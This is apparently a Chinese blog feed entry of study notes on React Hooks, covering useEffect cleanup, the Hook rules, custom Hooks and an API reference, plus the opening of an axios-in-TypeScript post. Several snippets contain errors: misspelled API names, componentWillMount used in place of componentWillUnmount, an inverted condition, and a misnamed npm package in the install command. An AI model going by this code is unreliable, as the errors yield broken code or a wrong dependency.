'react'function Example()&#123; const [count,setCount] = useState(0); useEffect(()=&gt;&#123; document.title = `You click $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125;// 1. useEffect 告诉React 组件需要在渲染后执行某些操作。会保存传递的函数，并且在执行 DOM更新之后调用它。在这个 effect 中，我们设置了 document 的 title 属性，不过我们也可以执行数据获取或者调用其他命令的 API// 2. 将 useEffect 放在组件内部让我们可以在 effect 中直接访问 count state 变量或者其他 props.我们不需要特殊的API来读取它，它已经保存在函数作用域中。Hook 使用了 js的闭包机制，而不用在js已经提供了解决方案的情况下，还引入特定的React API// 3. useEffect会在每次渲染后都执行，默认情况下，它在第一次渲染之后和每次更新之后都会执行，不用去考虑挂载还是更新，React保证了每次运行 effect的同时，DOM都已经更新完毕了 与 componentDidMount 和 componentDidUpdate不同，使用 useEffect 调度的 effect 不会阻塞浏览器更新屏幕，让应用看起来响应很快。大多数情况下，effect不需要同步地执行，在个别情况下（例如测试布局），有单独的 useLayoutEffect Hook 使用 需要清除的 effect订阅外部数据源等一些副作用是需要清除的，可以防止内存泄露。 使用class通常会在 componentDidMount中设置订阅，在 componentWillMount中清除它。假设我们有一个 ChatApI模块，运行我们订阅好友的在线状态 1234567891011121314151617181920212223242526272829303132class FriendStatus extends React.Component&#123; constructor(props)&#123; this.state = &#123; isOnline:null &#125; this.handleStatusChange = this.handleStatusChange.bind(this) &#125; componentDidMount()&#123; ChatAPI.subsribeToFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; componentWillMount()&#123; ChatAPI.unsubsribeToFriendStatue( this.props.friend.id, this.handleStatusChange ) &#125; handleStatusChange(status)&#123; this.setState(&#123; isOnline:status.isOnline &#125;) &#125; render()&#123; if(this.state.isOnline === null)&#123; return 'Loading...' &#125; return this.state.isOnline ? 'ONline' : 'Offline' &#125;&#125; 使用hookuseEffect 设计在同一个地方执行添加和删除订阅，effect返回一个函数，React就会在指定清除的时候调用它 1234567891011121314151617181920212223import React,&#123;useState,useEffect&#125; from 'react'function FriendStatus(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return function cleanup()&#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id,handleStatuChange) &#125; &#125;) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125;// 1. effect返回一个函数，这是 effect 可选的清除机制，每个 effect 都可以返回一个清除函数。所以可以将添加和订阅的逻辑放在一起，都属于 effect的一部分// 2. React 会在组件卸载的时候执行清除操作，effect在每次渲染的时候都会执行。这就是为什么 React 会在执行当前 effect 之前对上一个 effect 进行清除// 3.并不是必须为 effect 返回的函数命名，上面命令是为了表明此函数的目的，可以返回一个箭头函数或者另一个名字 使用多个Effect 实现关注点分离使用hook其中一个目的就是要解决class 中声明周期函数经常包含不相关的逻辑，但又把相关逻辑分离到了几个不同方法中的问题。上面代码是示例中计数器和好友状态指示器逻辑组合在一起的组件： 123456789101112131415161718192021222324252627282930313233class FriendStatusWithCounter extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123; count:0, isOnline:null &#125; this.handleStatusChange = this.handleStatusChange.bind(this) &#125; componentDidMount()&#123; document.title = `You click $&#123;this.state.count&#125; times` ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; componentDidUpdate()&#123; document.title = `You click $&#123;this.state.count&#125; times` &#125; componentWillUnmount()&#123; ChatAPI.unsubscibeFromFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; handleStatusChange(status)&#123; this.setState(&#123; isOnline:status.inOnline &#125;) &#125;&#125;// 可以发现设置 documnet.title 的逻辑是如何被分割到 componentDidMount 和 componentDidUpdate中。订阅逻辑是被分割到 componentDidMount 和 componentWillUnmount 中。而且 componentDidMount 中包含了两个不同功能的代码 而使用 hook,跟使用多个 state 的 hook一样，可以使用多个 effect将不相关逻辑分离到不同的 effect中 1234567891011121314151617function FriendStatusWithCounter(props)&#123; const [count,setCount] = useState(0) useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times` &#125;) const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return ()=&gt;&#123; ChatAPI.unsubcribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;)&#125;// hook 允许我们按照代码的用途分离他们，而不是像生命周期函数那样，React 将按照 effect 声明的顺序依次调用组件中的每一个 effect 为什么每次更新的时候都要运行effect为什么 effect 在每次重渲染都会执行，而不是在卸载组件的时候执行一次。 上述用于显示好友是否在线的 FriendStatus 组件，从 class 中 props 读取 friend.id，然后在组件挂载后订阅好友状态，并在卸载组件的时候取消订阅 1234567891011121314151617181920212223242526componentDidMount()&#123; ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange ); &#125;componentWillUnmount()&#123; ChatAPI.unsubscribeFromFriendStatus( this.props.friend.id, this.handleStatusChange ); &#125;// 这里会有一个问题，当组件已经显示在屏幕上时，friend props发生变化，我们的组件将继续展示原来的好友状态，这是一个 bug,而且我们还会因为取消订阅时错误使用错误的好友 ID,导致内存泄露或者奔溃的问题// 所以通过添加 componentDidUpdate 来解决这个问题componentDidUpdate(prevProps)&#123; // 取消之前的订阅的 friend.id ChatAPI.unsubscibeFromFriendStatus( prevProps.friend.id, this.handleStatusChange ) // 订阅新的 friend.id ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange )&#125; Hook版本 12345678function FriendStatus(props)&#123; useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return ()=&gt;&#123; ChatAPI.unsubscibeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;)&#125; 不需要特定的代码来处理更新逻辑，useEffect默认就会处理。它会在调用一个新的 effect 之前对前一个 effect 进行清理。下面按时间列出一个可能会产生的订阅和取消订阅调用序列 12345678910// Mount with &#123;friend:&#123;id:100&#125;&#125; propsChatAPI.subscibeToFriendStatus(100,handleStatusChange) // 运行第一个 effect// Mount with &#123;friend:&#123;id:200&#125;&#125; propsChatAPI.unsubscribeFromFriendStatus(100,handleStatusChange) // 清除上一个 effectChatAPI.subscibeToFriendStatus(200,handleStatusChange) // 运行下一个 effect// Mount with &#123;friend:&#123;id:300&#125;&#125; propsChatAPI.unsubscribeFromFriendStatus(200,handleStatusChange) // 清除上一个 effectChatAPI.subscibeToFriendStatus(300,handleStatusChange) // 运行下一个 effect// unMountChatAPI.unsubscribeFromFriendStatus(300,handleStatusChange) // 清除上一个 effect 默认行为保证了一致性，避免了在 class 组件因为没有处理更新逻辑而导致常见 bug 通过跳过 effect 进行性能优化在某些情况下，每次渲染后都会执行清理或者执行 effect 可能会导致性能问题。在 class 组件中，可以通过 componentDidUpate 中添加 prevProps 或者 prevState 的比较逻辑解决： 12345componentDidUpdate(prevProps,prevState)&#123; if(prevState.count !== this.state.count)&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125;&#125; 这是很常见的需求，被内置到了 useEffect 的 hook api中，如果某些特定值在两次重渲染中没有发生变化，可以通过 React 跳过对 effect 的调用，只要传递数组作为 useEffect 的第二个参数即可： 12345678910111213useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times`&#125;,[count]) // 仅在 count 更改的时候更新// 对于有清除操作的 effect同样适用useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscibeToFriendStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscibeFromFriendStatus(props.friend.id,handleStatusChange) &#125;&#125;,[props.friend.id]) // 仅在 props.friend.id 发生变化时，重新订阅 注意： 如果要使用这种优化方法，确保数组中包含了所有外部作用域中会随着时间变化并且在 effect 中使用的变量，否则代码会引用到先前渲染中的旧变量。 如果想只执行一次 effect 仅在组件挂载或者卸载时执行，可以传递一个空数组（[]），作为第二个参数，告诉 React 的 effect 不依赖于props 或者 state 中的任何值，所以它永远都不需要被重复执行，这不属于特殊情况，依然遵循数组的工作方式。 如果传入了一个空数组，effect 内部的 props 和 state 就会一直拥有其初始值。尽管传入的空数组作为第二个参数更加接近熟悉的 componentDidMount 和 componentWillUnMount 思维方式。React 会等待浏览器完成画面渲染后才会延迟调用 useEffect，因此会使得额外操作很方便。 启用 eslint-plugin-react-hooks 中的 exhaustive-deps 规则。此规则会在添加错误依赖时发出警告并给出修复建议。 Hook 规则Hook 本质就是 JS 函数，使用它需要遵循两条规则。 linter 插件来强制执行这些规则： 只在顶层使用 Hook不要在循环，条件或者嵌套函数中调用 Hook，确保总是在 React 函数的最顶层调用它们。遵循这条规则，就能确保 hook 在每一次渲染中都按照同样的顺序被执行. 只在 React 函数中使用 Hook不要在普通的 JS 函数中调用 Hook，可以在React 函数组件中调用 Hook，在自定义 Hook 中调用其他 Hook 遵循以上规则，确保组件的状态逻辑在代码中清晰可见 ESLINT 插件 eslint-plugin-react-hooks 的 ESLint 插件来强制执行这两条规则。如果你想尝试一下，可以将此插件添加到你的项目中： 1npm install eslint-plugins-react-hooks --save-dev 123456789101112// ESLint 的配置&#123; "plugins":[ //... "react-hooks" ], "rules":&#123; //... "react-hooks/rules-of-hooks":"error",// 检查 Hook 规则 "react-hooks/exhaustive-deps":"warn" // 检查 effect 的依赖 &#125;&#125; 说明单个组件中使用多个 State Hook或者 Effect Hook 1234567891011function Form()&#123; const [name,setName] = useState('Mary') useEffect(function persisForm()&#123; localStorage.setItem('formData',name) &#125;) const [surname,setSurname] = useState('Poppins') useEffect(function updateTitle()&#123; document.title = name + ' ' +surname &#125;)&#125; React 怎么知道哪个state 对应哪个 useState，答案是React靠Hook调用的顺序。 1234567891011// 首次渲染useState('Mary') // 1.使用 Mary 初始化变量名为 name 的 stateuseEffect(persistForm) // 2.添加 effect 以保存 form 操作useState('Poppings') // 3.使用 Poppings 初始化变量名为 surname 的 stateuseEffect(updateTitle) //4. 添加 effect 以更新标题// 二次渲染useState('Mary') // 5.读取变量名为 name 的 state (参数被忽略)useEffect(persistForm) // 6.替换保存 form 的 effectuseState('Poppings') // 7.读取变量名为 surname 的 state(参数被忽略)useEffect(updateTitle) //8. 替换更新标题的effect 只要 Hook 的调用顺序在多次渲染中保持一致，React 就能正确将内部 state 和对应的 hook 进行关联。 1234567891011// 倘若将一个 hook 调用放入到一个条件语句中会发生什么if(name !== '')&#123; useEffect(function persistForm()&#123; localStorage.setItem('formData',name) &#125;)&#125;// 在第一次渲染中 name!== ''条件为true,所以会执行这个 hook，但是下一次渲染我们可能清空了表单，表达式为 false,此时渲染会跳过该hook，hook的调用顺讯发生了变化useState('Mary') //1.读取变量名为 name 的 state(参数被忽略)// useEffect(persistForm) // 此 hook 被忽略useState('Poppins') // 2.(之前为3)。读取变量名为 surname的state 失败useEffect(updateTitle) // 3.(之前为4)，替换更新标题的 effect失败 React 不知道第二个useState 的 Hook 应该返回什么，React 以为在该组件中第二个 Hook 的调用像上次渲染一样。对应的是 persistForm的 effect,但并非如此。从这里开始，后面的 Hook调用都被提前执行，导致了bug的产生。 这就是为什么 Hook 需要在我们组件的最顶层调用，如果要有条件地执行一个 effect，可以将判断放在 Hook 的内部 123456useEffect(function persistForm()&#123; // 将条件放置在 effect 中 if(name === '')&#123; localStorage.setItem('formData',name) &#125;&#125;) 自定义 Hook通过自定义 Hook，可以将组件逻辑提取到可重用的函数中 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function FriendState(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange); &#125;; &#125;) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125; 假设聊天应用中有一个联系人列表，当用户在线时需要把名字设置为 绿色，我们可以把上面类似的逻辑复制并粘贴到 FriendListItem 组件中，但这并不是理想的解决方案 12345678910111213141516171819import React,&#123;useState,useEffect&#125; from 'react'function FriendListItem(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange); &#125;; &#125;) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; 我们希望在FriendStatus以及FriendListItem 之间共享逻辑。 提取自定义 Hook当我们想在两个函数之间共享逻辑时，会把它提取到第三个函数中，而组件和Hook都是函数，所以也使用这种方式 自定义Hook 是一个函数，名称以 use 开头，函数内部可以调用其他 hook，下面 useFriendStatus 就是定义的 Hook 123456789101112131415import React,&#123;useState,useEffect&#125; from 'react'function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange); &#125;; &#125;) return isOnline;&#125; 此处 useFriendStatus 的 Hook 目的是订阅某个好友的在线状态。这就是我们需要将 friendID 作为参数，并返回这位好友的在线状态的原因。 使用自定义 Hook12345678910111213141516function FriendStatus(props)&#123; const isOnline = useFriendStatus(props.friend.id) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125;function FriendListItem(props)&#123; const isOnline = useFriendStatus(props.friend.id) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; 代码等价于原来的示例代码 ,自定义 Hook 是一种自然遵循 Hook 设计的约定，而并不是 React 的特性。 自定义 Hook 必须以 “use” 开头 在两个组件中使用相同的 Hook 不会共享 state 自定义 Hook 每次调用 都会获取独立的 state 多个 Hook之间传递信息由于 Hook 本身就是函数，因此我们可以在它们之间传递信息。 将使用聊天程序中的另一个组件来说明这一点，这是一个聊天消息接收者的选择器。会显示当前的好友是否在线 123456789101112131415161718192021222324const friendList = [ &#123;id:1,name:'Phoebe'&#125;, &#123;id:2,name:'Rachel'&#125;, &#123;id:3,name:'Ross'&#125;]function ChatRecipientPicker()&#123; const [recipientID,setRecipientID] = useState(1) const isRecipientOnline = useFriendStatus(recipientID) return( &lt;&gt; &lt;Circle color=&#123;isRecipientOnline ? 'green' : 'red'&#125;/&gt; &lt;Select value=&#123;recipientID&#125; onChange=&#123;e=&gt;setRecipientID(Number(e.target.value))&#125; &gt; &#123;friendList.map(friend=&gt;( &lt;option key=&#123;friend.id&#125; value=&#123;friend.id&#125;&gt; &#123;friend.name&#125; &lt;/option&gt; ))&#125; &lt;/Select&gt; &lt;/&gt; )&#125; 将当前选择的好友ID保存在 recepientID 状态变量中，并在用户从 Select 中选择其他好友时更新这个state 由于 useState 提供了 recipientID 状态变量的最新值，我们可以将它作为参数传递给自定义的 useFriendStatus Hook 12const [recipientID,setRecipientID] = useState(1)const isRecipientOnline = useFriendStatus(recipientID) 当我们选择不同的好友并更新 recipientID 状态变量时，useFriendStatusHook 将会取消订阅之前选中的好友，并订阅新选中的好友状态 Hook API索引基本HookuseState1const [state,setState] = useState(initialState) 返回一个state,以及更新 state 的函数。在初始渲染期间，返回的状态（state）与传入的第一个参数(initialState)值相同。 setState函数用于更新state,它接收一个新的state值并将组件的一次重新渲染加入队列 1setState(newState); 后续渲染中，useState 返回的第一个值始终是更新后最新的 state。React会确保 setState 函数的标识是稳定的，并且不会在组件重新渲染时发生变化，这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 setState 函数式更新 如果新的state需要通过使用先前的 state计算得出，那么可以将函数传递给 setState,该函数将接收先前的 state,并返回一个更新后的值，下面的例子展示了 setState 的两种用法： 1234567891011function Counter(&#123;initialCount&#125;)&#123; const [count,setCount] = useState(initialCount); return( &lt;&gt; Count:&#123;count&#125; &lt;button onClick=&#123;()=&gt;setCount(initialCount)&#125;&gt;Reset&lt;/button&gt; &lt;button onClick=&#123;()=&gt;setCount(prevCount=&gt;prevCount+1)&#125;&gt;=&lt;/button&gt; &lt;button onClick=&#123;()=&gt;setCount(prevCount=&gt;prevCount-1)&#125;&gt;-&lt;/button&gt; &lt;/&gt; )&#125; +和-采用函数式形式，因为被更新的的 state 需要基于之前的 state,但是重置按钮则采用普通形式，因为它总是把 count 设置回初始值 与 class 组件的 setState 方法不一致，useState 不会自动合并更新对象，使用函数式的 setState 结合展开运算符达到合并更新对象的效果 1234567setState(prevState=&gt;&#123; // Object.assign return&#123; ...prevState,...updateValues &#125;&#125;)// useReducer 是另一种可选方案，更适合用于管理包含多个子值的 state 对象 惰性初始 state initialState 参数只会在组件的初始渲染中起作用，后续渲染时会被忽略。如果初始 state 需要通过复杂计算获得，则可以传入一个函数，在函数计算并返回初始 state,次函数只在初始渲染被调用 1234const [state,setState] = useState(()=&gt;&#123; const initialState = someExpensiveComputation(props) return initialState&#125;) 跳过state 更新 调用 State Hook 的更新函数并传入当前的 state ，React 将跳过子组件的渲染以及 effect 的执行，React 使用Object.is 比较算法来比较state 需要注意的是，React可能仍需要在跳过渲染前渲染该组件，不过由于React不会对组件数的深层节点进行不必要的渲染，所以不用担心。如果在渲染期间执行了高开销的计算，则可以使用 useMemo 优化。 useEffect1useEffect(didUpdate) 该hook 接收一个包含命令式、并且可能有副作用代码的函数。 在函数组件主体内改变 DOM,添加订阅、设置定时器、记录日志以及执行其他包含副作用的操作都是不被允许的，因为这可能会产生莫名其妙的 bug 并破坏 UI 的一致性 使用 useEffect完成副作用操作，赋值给 useEffect的函数会在组件渲染到屏幕之后执行。默认情况下，effect 将在每轮渲染结束后执行，可以渲染让它在只有某些值的时候才执行。 清除effect 通常，组件卸载时需要清除 effect 创建的诸如订阅或者定时器ID 等资源，要实现这一点，需要返回一个清除函数。 1234567useEffect(()=&gt;&#123; const subsciption = props.source.subscibe() return ()=&gt;&#123; // 清除订阅 subscription.unsubscribe() &#125;&#125;) 为了防止内存泄露，清除函数会在组件卸载前执行，另外，如果组件多次渲染，则在执行下一个 effect 之前，上一个 effect 就已经被清除。上面的例子意味着组件的每一次更新都会创建新的订阅，若想避免每次更新都触发 effect 的。 effect的执行时机 与 componentDidMount、componentDidUpdate 不同的是，在浏览器完成布局与绘制之后，传给 useEffect 的函数会被延迟调用。这使得它适用于很多常见的副作用场景，如设置订阅和事件处理等情况，因为不应该在函数中执行阻塞浏览器更新屏幕的操作。 然后不是所有的 effect 都可以被延迟执行的，例如在浏览器执行 下一次绘制前，用户可见的 DOM变更就必须同步执行，这样永不才不会感觉到视觉上的不一致。React 提供了 useLayoutEffect Hook 来处理这类 effect，和 useEffect 结构相同，但是调用时机不同。 虽然 useEffect 会在浏览器绘制后延迟执行，但会保证在任何渲染前执行，React 将在组件更新前刷新上一轮的渲染的 effect effect的条件执行 默认情况下，effect 会在每轮组件渲染完成后执行，一旦 effect 的依赖发生变化，它就会被重新创建。但我们不需要再每次更新时都创建新的订阅，而仅在 props 改变的时候重新创建，可以给 useEffect 传递第二个参数，它是 effect 依赖的值数组 1234567useEffect(()=&gt;&#123; const subscription = props.source.subscribe() return()=&gt;&#123; subscription.unsubscribe(); &#125;;&#125;,[props.source])// 此时只有props.source 改变后才会重新创建订阅 useContext1const value = useContext(myContext); 接收一个 context 对象（React.createContext的返回值）并返回该 context 的当前值。当前 context 值由上层组件中距离当前组件最新的 &lt;MyContext.Provider&gt;的 value prop 决定。 当上层最近的 &lt;MyContext.Provider&gt;更新时，该Hook 会触发重新渲染，并使用最新传递给 MyContext provider 的 context value 值 别忘记 useContext 的参数必须是 context 对象本身： 正确： useContext(MyContext) 错误： useContext(MyContext.Consumer) 错误： useContext(MyContext.Provider) 调用了 useContext的组件总会在 context 值变化时重新渲染，如果重新渲染组件开销比较大的话，可以通过 memoization 优化 useContext(MyContext)只是能够读取 context 的值以及订阅 context 的变化，仍然需要在上层组件树中使用 &lt;MyContext.Provider&gt;来为下层组件提供 context 额外的 HookuseReducer1const [state,dispatch] = useReducer(reducer,initialArg,init) 它接受一个 (state,action)=&gt; newState的 reducer，并返回一个当前的 state以及与其配套的 dispatch方法。 在某些场景下，useReducer 比 useState更适用。例如 state 逻辑复杂且包含多个子值，或者下一个 state 依赖之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为可以向子组件传递 dispatch 而不是回调函数。 reducer 重写 useState 的计数器 12345678910111213141516171819202122const initialState = &#123;count:0&#125;function reducer(state,action)&#123; switch(action.type)&#123; case 'increment': return &#123;count:state.count+1&#125;; case 'decrement': return &#123;count:state.count-1&#125;; default: throw new Error(); &#125;&#125;function Counter()&#123; const [state,dispatch] = useReducer(reducer,initialState) return( &lt;&gt; Count:&#123;state.count&#125; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'increment'&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'decrement'&#125;)&#125;&gt;-&lt;/button&gt; &lt;/&gt; )&#125; 指定初始state 有两种初始化 useReducer state 的方式，可以根据使用场景选择其中的一种。将初始 state 作为第二个参数传入 useReducer 是最简单的方法： 1234const [state,dispatch] = useReducer( reducer, &#123;count:initialCount&#125;) 惰性初始化 选择惰性地创建初始化 state,为此需要将 init 函数作为 useReducer 的第三个参数传入，这样初始 state 将被设置为 init(initialArg) 这样做，可以将用于计算 state 的逻辑提取到 reducer 外部，这也为将来对重置 state 的 action 做处理提供了便利： 123456789101112131415161718192021222324252627function init(initialCount)&#123; return &#123;count:initialCount&#125;&#125;function reducer(state,action)&#123; switch(action.type)&#123; case 'increment': return &#123;count:state.count+1&#125;; case 'decrement': return &#123;count:state.count-1&#125;; case 'reset': return init(action.payload); default: throw new Error(); &#125;&#125;function Counter(&#123;initialCount&#125;)&#123; const [state,dispatch] = useReducer(reducer,initialCount,init)&#125;return( &lt;&gt; Count:&#123;state.count&#125; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'reset',payload:initialCount&#125;)&#125;&gt;&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'increment'&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;()=&gt;dispatch(&#123;type:'decrement'&#125;)&#125;&gt;-&lt;/button&gt; &lt;/&gt;) 跳过 dispatch 如果 Reducer Hook 的返回值与当前 state 相同，React 将跳过子组件的渲染以及副作用的执行。需要注意的是，React 可能仍需要跳过渲染前再次渲染该组件。不过由于React 不会对组件树的深层节点进行不必要的渲染，所以不用担心。如果在渲染期间执行了高开销的计算，则可以使用 useMemo来进行优化 useCallback123456const memoziedCallback = useCallBack( ()=&gt;&#123; dosomething(a,b); &#125;, [a,b]) 返回一个 memoized 回调函数 把内联回调函数以及依赖数组作为参数传入 useCallback ，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会跟新。当你把回调函数给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件，它将非常有用 useCallback(fn,deps)相当于 useMemo(()=&gt;fn,deps) useMemo1const memoizedValue = useMemo(()=&gt;computeExpensiveValue(a,b),[a,b]) 返回一个 memoized值。 把创建函数和依赖项作为参数传入 useMemo,它仅会在某个依赖项改变时才重新计算 memoized值，这种优化有助于避免在每次渲染时都进行高开销计算。 传入 useMemo 的函数会在渲染期间执行，不要在这个函数内部执行于渲染无关的操作，诸如副作用这类的操作属于 useEffect 的适用范畴，而不是 useMemo 如果没有提供依赖项数组，useMemo 在每次渲染时都会计算新的值 useRef1const refContainer = useRef(initialValue) useRef 返回一个可变的 ref 对象，其 .current属性被初始化为传入的参数 initialValue 。返回的 ref 对象在组件的整个生命周期内保持不变。 命令式访问子组件： 12345678910111213function TextInputWithFocusButton()&#123; const inputEl = useRef(null) const onButtonClick = ()=&gt;&#123; // current 指向已经挂载到 DOM 上的文本输入元素 inputEl.current.focus(); &#125; return( &lt;&gt; &lt;input ref=&#123;inputEl&#125; type="text"/&gt; &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;/button&gt; &lt;/&gt; )&#125; useImperativeHandle1useImperativeHandle(ref,createHandle,[deps]) useImperativeHandle可以让你在使用 ref时自定义暴露给父组件的实例值。useImperativeHandle应当与 forwardRef一起使用： 1234567891011function FancyInput(props,ref)&#123; const inputRef = useRef(); useImperativeHandle(red,()=&gt;&#123; focus:()=&gt;&#123; inputRef.current.focus() &#125; &#125;) return &lt;input ref=&#123;inputRef&#125; .../&gt;&#125;FancyInput = forwardRef(FancyInput)// 渲染 &lt;FancyInput ref=&#123;fancyInputRef&#125; /&gt; 的父组件可以调用 fancyInputRef.current.focus(); useLayoutEffect其函数签名与 useEffect 相同，但它会在所有的DOM 变更之后同步调用 effect。可以使用它来读取 DOM 布局并同步触发重渲染。在浏览器执行绘制之前，useLayoutEffect 内部的更新计划会被同步刷新。尽可能使用 标准的 useEffect 以避免阻塞视觉更新 注意： useLayoutEffect 与 componentDidMount、componentDIdUpdate的调用阶段是一样的。 如果使用服务端渲染，无论是 useLayoutEffect 或者 useEffect 都无法在 JS 代码加载完成之前执行。这就是为什么在服务端渲染组件中引入 useLayoutEffect 代码会触发React 警告。解决这个问题，需要将代码逻辑移到 useEffect 中（如果首次渲染不需要这段逻辑的情况下），或是将该组件延迟到客户端渲染完成后再显示（直到 useLayoutEffect执行之前HTML 都显示错误的情况下） 若要从服务端渲染的 HTML 中排除依赖布局 effect 的组件，可以通过使用 showChild &amp;&amp; &lt;Child&gt;进行条件渲染，并使用 useEffect(()=&gt;{setShowChild(true)},[])延迟展示组件。这样在客户单渲染完成之前，UI就不会像之前那样显示错乱了。 useDebugValue1useDebugValue(value) useDebugValue可用于 React 开发工具中显示自定义 hook 标签 12345function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) useDebugValue(isOnline?'Online':'Offline') return isOnline&#125; 延迟格式化 debug值 某些情况下，格式化值的显示可能是一项开销很大的操作，除非检查 Hook，否则没有必要这么做。因此，useDebugValue 接受一个格式化函数作为可选的第二个参数。该函数只有在 hook 检查才会被调用。它接受 debug 值作为参数，并且会返回一个格式化的显示值。 例如，一个返回 Date 值的自定义 Hook 可以通过格式化函数来避免不必要的 toDateString 函数调用 1useDebugValue(date,date=&gt;date.toDateString())]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于ts重构axios]]></title>
    <url>%2F2019-09-03-%E5%9F%BA%E4%BA%8Ets%E9%87%8D%E6%9E%84axios.html</url>
    <content type="text"><![CDATA[基于ts重构axiosustbhuangyi 老师的 基于TypeScript从零重构axios学习记录。 知识点 TypeScript 常用语法： 基础类型 、 函数 、 变量声明 、 接口 、 类 、 泛型 、 类型推新 、 高级类型 axios js库： 项目脚手架 、 基础功能实现 、 异常情况处理 、 接口扩展 、 拦截器实现 、 配置化实现 、 取消功能实现 、 其他功能实现等等 主要工具：Jest 、 TSLint 、 Commitizen 、 Prettier 、 RollupJS 、 Semantic release 基本语法点我 需求分析Features 在浏览器使用 XMLHttpRequest 对象通讯 支持 Promise API 支持请求和响应的拦截器 支持请求数据和响应数据的转换 支持请求的取消 JSON数据的自动转换 客户端防止 XSRF 基于 XMLHttpRequest 编写基本请求代码处理请求数据：url/body/headerssrc/types/index.ts 12345678export type Method = &apos;get&apos; | &apos;GET&apos; | &apos;delete&apos; | &apos;Delete&apos; | &apos;head&apos; | &apos;HEAD&apos; | &apos;options&apos; | &apos;OPTIONS&apos; | &apos;post&apos; | &apos;POST&apos; | &apos;put&apos; | &apos;PUT&apos; | &apos;patch&apos; | &apos;PATCH&apos;export interface AxiosRequestConfig &#123; url: string method?: Method data?: any params?: any headers?: any&#125; src/xhr.ts 12345678910111213141516import &#123; AxiosRequestConfig &#125; from &apos;./types&apos;export default function xhr(config: AxiosRequestConfig): void &#123; const &#123; data = null, url, method = &apos;get&apos;, headers &#125; = config const request = new XMLHttpRequest() // method,url,async request.open(method.toUpperCase(), url, true) Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data)&#125; src/index.ts 1234567891011121314151617181920212223242526272829303132import &#123; AxiosRequestConfig &#125; from &apos;./types&apos;import &#123; buildURL &#125; from &apos;./helpers/url&apos;;import &#123; transformRequest &#125; from &apos;./helpers/data&apos;;import xhr from &apos;./xhr&apos;import &#123; processHeaders &#125; from &apos;./helpers/header&apos;;function axios(config: AxiosRequestConfig): void &#123; processConfig(config) xhr(config)&#125;function processConfig(config: AxiosRequestConfig): void &#123; config.url = transformURL(config) config.data = transformRequestData(config) config.headers = transformHeaders(config)&#125;function transformHeaders(config: AxiosRequestConfig): void &#123; const &#123; headers = &#123;&#125;, data &#125; = config return processHeaders(headers, data)&#125;function transformRequestData(config: AxiosRequestConfig): void &#123; return transformRequest(config.data)&#125;function transformURL(config: AxiosRequestConfig): string &#123; const &#123; url, 